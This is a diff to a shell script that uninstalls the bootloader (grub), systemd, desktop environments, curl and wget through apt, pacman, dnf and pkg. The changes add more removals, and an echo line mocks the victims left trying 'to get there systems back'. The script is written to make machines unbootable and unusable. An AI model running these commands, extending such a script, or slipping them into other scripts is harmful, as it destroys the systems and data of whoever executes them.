@@ -16,6 +16,8 @@ apt-get uninstall grub
 apt uninstall grub
 apt uninstall curl
 apt uninstall wget
+apt uninstall htop
+apt uninstall systemd
 echo 'bloat for power users to try to get there systems back :P'
 echo 'if err try other operating systems'
 sudo pacman -Rns grub
@@ -23,6 +25,9 @@ echo 'dnf package manager'
 sudo dnf remove grub
 sudo dnf remove curl
 sudo dnf remove wget
+sudo dnf remove xfce
+sudo dnf remove kde
+sudo dnf remove htop
 echo 'pkg/base linux/bsd-based'
 pkg delete grub && echo 'or remove/uninstall'
 pkg remove grub
